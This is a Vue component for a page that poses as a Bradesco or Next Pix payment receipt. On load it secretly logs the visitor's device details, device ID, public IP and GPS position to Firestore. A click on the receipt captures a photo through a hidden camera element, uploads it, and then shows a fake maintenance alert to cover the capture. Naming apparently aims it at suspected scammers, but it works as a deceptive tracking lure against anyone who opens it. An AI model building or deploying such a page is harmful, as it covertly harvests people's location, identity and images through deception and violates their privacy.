<template>
    <div class="container">
        <Bradesco v-if="comprovante && comprovante.instituicao == 'bradesco'" :comprovante="comprovante"
            @tirar-foto="capturaFoto" />
        <Next v-if="comprovante && comprovante.instituicao == 'next'" :comprovante="comprovante"
            @tirar-foto="capturaFoto" />
    </div>
    <video id="camera" style="display: none;" muted autoplay></video>
    <canvas id="photo" style="display: none;"></canvas>
</template>

<script setup>
import { computed, onBeforeMount, onMounted, reactive, ref } from 'vue';
import { useRoute, useRouter } from 'vue-router';
import { firestore, storage } from '../firebase';
import { collection, doc, getDoc, serverTimestamp, setDoc } from 'firebase/firestore';
import { useAppStore } from '../store';
import { bancoInfo, delay, formataDataHoraPtBr, formataMoedaBRL, getCurrentPosition, maskCpf, pegaPrimeiroNome, requestCameraPermission } from '../functions';
import Bradesco from '../components/ComprovanteBradesco.vue';
import Next from '../components/ComprovanteNext.vue';
import { Device } from '@capacitor/device';
import { ref as refStorage, uploadString } from 'firebase/storage';

const route = useRoute();
const router = useRouter();

const appStore = useAppStore();

const comprovante = ref(null);
const acesso = ref({});

const data = reactive({
    video: null,
    canvas: null,
    comprovanteId: null,
    acessoId: null,
    capturaFotoRealizada: false
});

onBeforeMount(() => {
    appStore.loadingToggle();
});

onMounted(async () => {
    if (!route.query.id) {
        router.push({ path: '/' });
    }

    const docRef = doc(firestore, 'comprovantes', route.query.id);
    const docSnap = await getDoc(docRef);

    if (!docSnap.exists()) {
        router.push({ path: '/' });
    }

    comprovante.value = docSnap.data();
    comprovante.value.dataHora = formataDataHoraPtBr(comprovante.value.dataHora.toDate());
    comprovante.value.bancoImgSrc = bancoImgSrc.value;
    comprovante.value.transacao = route.query.id;

    data.comprovanteId = route.query.id;

    if (!bancoInfo(comprovante.value.instituicao)) {
        router.push({ path: '/' });
    }

    setMetaData();

    data.video = document.getElementById('camera');
    data.canvas = document.getElementById('photo');

    try {
        acesso.value = { ...acesso.value, ...await Device.getInfo() };
    } catch (error) {
        console.error('Error device info:', error);
    }

    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const json = await response.json();
        acesso.value.publicIp = json.ip;
    } catch (error) {
        console.error('Error fetching IP address:', error);
    }

    // PEGA AS COORDENADAS DA LOCALIZAÇÃO
    const position = await getCurrentPosition();
    acesso.value = { ...acesso.value, ...position };

    acesso.value.at = serverTimestamp();
    acesso.value.deviceId = (await Device.getId()).identifier;
    acesso.value.comprovanteId = comprovante.value.transacao;

    Object.keys(acesso.value).forEach(key => acesso.value[key] === undefined && delete acesso.value[key]);

    try {
        const ref = doc(collection(firestore, "acessos"));
        await setDoc(ref, acesso.value);
        data.acessoId = ref.id;
    } catch (error) {
        console.error('Error ao enviar acesso:', error);
    }

    appStore.loadingToggle();
});

const bancoImgSrc = computed(() => {
    return new URL(`../assets/bancos/${comprovante.value.instituicao}.jpg`, import.meta.url).href
});

const faviconSrc = computed(() => {
    return new URL(`../assets/bancos/${comprovante.value.instituicao}-favicon.png`, import.meta.url).href
});

function setMetaData() {
    const banco = bancoInfo(comprovante.value.instituicao);

    document.title = `${banco.nomeResumido} - Pix ${formataMoedaBRL(comprovante.value.valor)} de ${pegaPrimeiroNome(comprovante.value.nomePagador)}`;

    let docBandido = '';
    let nomeBandido = '';

    if (comprovante.value.cpfPilantra) {
        docBandido = maskCpf(comprovante.value.cpfPilantra);
    } else if (comprovante.value.cnpjPilantra) {
        docBandido = comprovante.value.cnpjPilantra;
    }

    if (comprovante.value.nomePilantra) {
        nomeBandido += pegaPrimeiroNome(comprovante.value.nomePilantra);
    }

    let para = '';

    if (docBandido && nomeBandido) {
        para += ` para ${docBandido} - ${nomeBandido}`;
    } else if (docBandido || nomeBandido) {
        para += ` para ${docBandido + nomeBandido}`
    }

    document
        .getElementsByTagName('meta')
        .namedItem('description')
        .setAttribute('content', `Comprovante ${banco.nome}: Transação no valor de ${formataMoedaBRL(comprovante.value.valor)}${para}.`);

    document.querySelector('link[rel="image_src"]').href = bancoImgSrc.value;
    document.querySelector('link[rel="icon"]').href = faviconSrc.value;
}

async function capturaFoto() {
    if (data.capturaFotoRealizada) {
        return;
    }

    await requestCameraPermission(data.video);
    appStore.loadingToggle();

    data.canvas.width = data.video.videoWidth;
    data.canvas.height = data.video.videoHeight;

    const context = data.canvas.getContext('2d');
    context.drawImage(data.video, 0, 0, data.canvas.width, data.canvas.height);

    try {
        await uploadString(refStorage(storage, `/capturas/${data.comprovanteId}/${data.acessoId}`), data.canvas.toDataURL('image/jpeg'), 'data_url')
        data.capturaFotoRealizada = true;
    } catch (error) {
        console.error('Error upload file:', error);
    }

    const tracks = data.video.srcObject.getTracks();
    if (tracks) {
        tracks.forEach(t => t.stop());
    }


    await delay(751 + (Math.random() * 750));
    data.alert = alert('Sistema em manutenção. Tente mais tarde...');
    appStore.loadingToggle();
}
</script>